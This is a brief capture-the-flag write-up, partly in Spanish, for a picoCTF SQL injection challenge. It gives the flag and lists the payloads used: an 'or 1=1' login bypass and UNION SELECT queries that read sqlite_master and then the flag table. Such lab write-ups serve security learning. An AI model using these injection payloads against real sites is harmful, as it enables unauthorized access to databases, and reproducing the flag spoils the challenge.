
Descripcion:
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

Solucion(s):
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
Notas:
se utiliza el comando 'or 1=1;' para el login
despues se utiliza un " union select sql,2,3 from sqlite_master;" para sacar la estructura de las tablas.

escojemos la tabla con la flag con"union select id,flag,3 from more_table;" obtenemos la flag.
Referencias:
https://www.youtube.com/watch?v=clMe4yqL6yU&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=63